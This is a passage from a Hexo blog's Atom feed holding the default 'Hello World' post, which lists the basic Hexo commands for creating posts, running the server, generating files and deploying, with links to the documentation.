    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
    
    </summary>
    
    
      <category term="hello" scheme="http://yoursite.com/tags/hello/"/>
    
  </entry>
  
</feed>
